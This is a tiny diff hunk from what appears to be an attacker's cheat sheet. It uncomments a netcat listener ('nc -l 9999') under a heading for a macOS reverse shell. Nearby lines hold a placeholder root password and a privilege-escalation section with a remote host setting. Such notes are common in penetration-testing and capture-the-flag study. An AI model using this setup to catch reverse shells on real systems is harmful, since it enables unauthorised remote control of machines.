@@ -36,7 +36,7 @@ password : rootpassword
 
 
 # macOS Reverse Shell nc command
-## nc -l 9999
+nc -l 9999
 
 # Privilege Escalate
 RHOST : MyIP
